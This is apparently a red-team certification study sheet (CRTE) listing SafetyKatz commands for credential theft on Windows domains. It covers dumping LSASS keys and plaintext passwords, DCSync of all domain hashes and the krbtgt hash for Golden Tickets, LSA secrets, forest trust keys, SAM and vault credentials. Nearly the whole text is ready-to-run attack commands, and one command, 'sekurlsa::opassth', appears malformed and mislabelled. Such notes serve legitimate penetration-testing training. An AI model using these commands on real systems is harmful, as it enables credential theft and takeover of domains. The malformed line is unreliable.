# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## SafetyKatz

**Extracts Kerberos encryption keys (AES/NTLM) from LSASS:**
```cmd
SafetyKatz.exe "sekurlsa::ekeys" "exit"
```

**Alternative to `ekeys` for Kerberos keys extraction:**
```cmd
SafetyKatz.exe "sekurlsa::keys" "exit"
```

**Performs DCSync to pull all domain user hashes (requires DA rights):**
```cmd
SafetyKatz.exe "lsadump::dcsync" "exit"
```

**DCSync for a specific user (e.g., krbtgt for Golden Tickets):**
```cmd
SafetyKatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt" "exit"
```

**Dumps plaintext passwords and NTLM hashes from LSASS:**
```cmd
SafetyKatz.exe "sekurlsa::logonpassword" "exit"
```

**Retrieves LSA secrets (cached domain creds, service accounts):**
```cmd
SafetyKatz.exe "lsadump::lsa /patch" "exit"
```

**Extracts domain trust keys (for Golden Ticket attacks across forests):**
```cmd
SafetyKatz.exe "lsadump::trust" "exit"
```

**Dumps local SAM database (non-domain user hashes):**
```cmd
SafetyKatz.exe "lsadump::sam" "exit"
```

**Lists saved credentials in Windows Vault (e.g., RDP/Wi-Fi passwords):**
```cmd
SafetyKatz.exe "vault::list" "exit"
```

**Decrypts and extracts Windows Vault credentials:**
```cmd
SafetyKatz.exe "vault::cred /patch" "exit"
```

**Parses an LSASS memory dump (offline credential extraction):**
```cmd
SafetyKatz.exe "sekurlsa::minidump lsass.dmp" "exit"
```

**Extracts Kerberos TGTs for Pass-the-Ticket attacks:**
```cmd
SafetyKatz.exe "sekurlsa::opassth" "exit"
```